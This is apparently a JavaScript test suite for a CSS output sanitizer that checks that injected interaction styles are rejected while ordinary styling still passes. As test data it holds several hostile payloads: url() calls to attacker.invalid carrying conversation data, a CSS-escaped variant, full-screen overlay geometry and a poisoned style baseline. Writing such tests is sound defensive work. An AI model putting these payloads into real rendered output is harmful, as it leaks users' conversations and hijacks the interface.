import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';

const sourcePath = new URL('../src/outputSanitizer.js', import.meta.url);
const source = fs.readFileSync(sourcePath, 'utf8');

function extractFunction(name) {
    const start = source.indexOf(`function ${name}(`);
    assert.notEqual(start, -1, `missing ${name}`);
    const candidates = [source.indexOf('\nfunction ', start + 1), source.indexOf('\nexport function ', start + 1)].filter(index => index > start);
    const next = candidates.length ? Math.min(...candidates) : -1;
    return source.slice(start, next > start ? next : undefined).trim();
}

const functionNames = [
    'normalizeStylePropertyName',
    'normalizeRecoveredInteractionStyleAssignments',
    'currentRecoveredInteractionOverlayDeclarationMap',
    'sanitizeRecoveredInteractionStyleAssignments',
    'readReversibleStyleBaseline',
    'parseInlineStyleAssignments',
    'applyPseudoStyleAssignments',
    'restorePseudoStyleState',
    'decodeCssEscapesForSecurity',
    'normalizeGeneratedResourceValue',
    'isAllowedTarotImageUrl',
    'decodeSvgDataImagePayload',
    'isSafeSvgDataImageValue',
    'isAllowedGeneratedResourceValue',
    'cssContainsUnsafeGeneratedResource',
    'splitCssDeclarationList',
    'cssDeclarationBodies',
    'zeroEdgeDeclarationPresent',
    'cssDeclarationBlockContainsUnsafeOverlayGeometry',
    'sanitizeGeneratedCssDeclarationBlock',
];

const program = [
    "const RABBIT_MIRROR_TAROT_ORIGIN = 'https://i.postimg.cc';",
    "const RABBIT_MIRROR_TAROT_PATH_RE = /^\\/rabbit-mirror\\/tarot\\/[a-z0-9._/-]+$/i;",
    'const RABBIT_MIRROR_MAX_DATA_IMAGE_CHARS = 400000;',
    'const REVERSIBLE_STYLE_BASELINE_ATTR = "data-rm-reversible-style-baseline";',
    'const reversibleStyleBaselineStates = new WeakMap();',
    ...functionNames.map(extractFunction),
    'globalThis.probe = { parseInlineStyleAssignments, applyPseudoStyleAssignments, readReversibleStyleBaseline, restorePseudoStyleState };',
].join('\n');

let computedStyleCalls = 0;
const sandbox = {
    URL,
    getComputedStyle(element) {
        computedStyleCalls += 1;
        const values = element?.computed || {};
        return { getPropertyValue: property => values[property] || '' };
    },
};
vm.runInNewContext(program, sandbox, { filename: sourcePath.pathname });

class FakeStyle {
    constructor(initial = {}) {
        this.values = new Map(Object.entries(initial));
        this.calls = [];
    }
    get length() { return this.values.size; }
    item(index) { return [...this.values.keys()][index] || ''; }
    getPropertyValue(property) { return this.values.get(property) || ''; }
    getPropertyPriority() { return ''; }
    setProperty(property, value, priority) {
        this.values.set(property, String(value));
        this.calls.push({ property, value: String(value), priority });
    }
    removeProperty(property) { this.values.delete(property); }
}

const eventSource = [
    "this.style.backgroundImage='url(https://attacker.invalid/pixel?conversation=encoded)'",
    "this.style.position='fixed'",
    "this.style.inset='0'",
    "this.style.zIndex='2147483647'",
].join(';');

assert.deepEqual(
    JSON.parse(JSON.stringify(sandbox.probe.parseInlineStyleAssignments(eventSource))),
    [],
    'the original external-url/full-overlay payload must be rejected before binding',
);

const encodedUrl = "this.style.backgroundImage='u\\72l(https://attacker.invalid/encoded)'";
assert.deepEqual(
    JSON.parse(JSON.stringify(sandbox.probe.parseInlineStyleAssignments(encodedUrl))),
    [],
    'CSS-escaped url() must be rejected',
);

const crossState = { style: new FakeStyle({ inset: '0', width: '100vw', height: '100vh' }) };
const crossStateApplied = sandbox.probe.applyPseudoStyleAssignments(crossState, [
    { property: 'position', value: 'fixed' },
]);
assert.equal(crossStateApplied, 0, 'existing geometry plus recovered fixed positioning must be rejected');
assert.equal(crossState.style.calls.length, 0);

const stylesheetCrossState = {
    style: new FakeStyle(),
    computed: { position: 'fixed', top: '0px', right: '0px', bottom: '0px', left: '0px' },
};
assert.equal(
    sandbox.probe.applyPseudoStyleAssignments(stylesheetCrossState, [{ property: 'z-index', value: '2147483647' }]),
    0,
    'stylesheet positioning plus recovered overlay state must be rejected',
);
assert.equal(stylesheetCrossState.style.calls.length, 0);

const cumulativeState = { style: new FakeStyle() };
assert.equal(sandbox.probe.applyPseudoStyleAssignments(cumulativeState, [{ property: 'position', value: 'fixed' }]), 1);
assert.equal(sandbox.probe.applyPseudoStyleAssignments(cumulativeState, [{ property: 'inset', value: '0' }]), 0);
assert.equal(cumulativeState.style.calls.length, 1, 'a later timeline stage must not complete a full-screen overlay');

const poisonedBaselineValue = encodeURIComponent(JSON.stringify({
    'background-image': { value: 'url(https://attacker.invalid/restored)', priority: '' },
}));
const poisonedBaselineElement = {
    style: new FakeStyle({ 'background-image': 'none' }),
    getAttribute: name => name === 'data-rm-reversible-style-baseline' ? poisonedBaselineValue : '',
    removeAttribute(name) { this.removed = name; },
};
assert.equal(sandbox.probe.readReversibleStyleBaseline(poisonedBaselineElement).size, 0);
assert.equal(poisonedBaselineElement.removed, 'data-rm-reversible-style-baseline');
assert.equal(
    sandbox.probe.restorePseudoStyleState(poisonedBaselineElement, new Map([
        ['background-image', { value: 'url(https://attacker.invalid/restored)', priority: '' }],
    ])),
    0,
    'poisoned serialized baselines must not bypass the recovered-style gate during restore',
);
assert.equal(poisonedBaselineElement.style.calls.length, 0);

const reversibleSafeState = { style: new FakeStyle({ position: 'relative', inset: '0' }) };
assert.equal(
    sandbox.probe.restorePseudoStyleState(reversibleSafeState, new Map([
        ['position', { value: 'fixed', priority: '' }],
        ['inset', { value: '', priority: '' }],
    ])),
    2,
    'restore validation must model removals before judging the intended final geometry',
);
assert.equal(reversibleSafeState.style.getPropertyValue('position'), 'fixed');
assert.equal(reversibleSafeState.style.getPropertyValue('inset'), '');

const localPopup = {
    style: new FakeStyle({ position: 'fixed', top: '12px', left: '12px', width: '240px', height: '160px', 'z-index': '20' }),
};
const callsBeforeNonGeometryUpdate = computedStyleCalls;
assert.equal(
    sandbox.probe.applyPseudoStyleAssignments(localPopup, [{ property: 'opacity', value: '1' }]),
    1,
    'ordinary bounded fixed-position interaction panels must remain compatible',
);
assert.equal(computedStyleCalls, callsBeforeNonGeometryUpdate, 'non-geometry interactions must not force computed-style work');

const safeEvent = "this.style.opacity='1';this.style.transform='rotateY(180deg)';this.style.backgroundColor='#223344'";
const safeAssignments = sandbox.probe.parseInlineStyleAssignments(safeEvent);
assert.deepEqual(
    JSON.parse(JSON.stringify(safeAssignments)),
    [
        { property: 'opacity', value: '1' },
        { property: 'transform', value: 'rotateY(180deg)' },
        { property: 'background-color', value: '#223344' },
    ],
    'ordinary interaction styling must remain available',
);
const safeElement = { style: new FakeStyle() };
assert.equal(sandbox.probe.applyPseudoStyleAssignments(safeElement, safeAssignments), 3);
assert.equal(safeElement.style.calls.length, 3);
assert.ok(safeElement.style.calls.every(item => item.priority === 'important'));

const directIdBlock = source.slice(source.indexOf('function applyDirectIdClickAssignments('), source.indexOf('\nfunction bindDirectIdClickProgram', source.indexOf('function applyDirectIdClickAssignments(')));
assert.match(directIdBlock, /applyPseudoStyleAssignments\(action\.target, \[action\]\)/);
const timelineBlock = source.slice(source.indexOf('function applyRawScriptTimelineActions('), source.indexOf('\nfunction ', source.indexOf('function applyRawScriptTimelineActions(') + 1));
assert.match(timelineBlock, /applyPseudoStyleAssignments\(action\.target, \[action\]\)/);
const internalAttrBlock = source.slice(source.indexOf('const RABBIT_MIRROR_INTERNAL_MODEL_ATTRS'), source.indexOf('const RABBIT_MIRROR_TAROT_ORIGIN'));
assert.match(internalAttrBlock, /REVERSIBLE_STYLE_BASELINE_ATTR/);

console.log('output sanitizer recovered interaction CSS security: PASS');
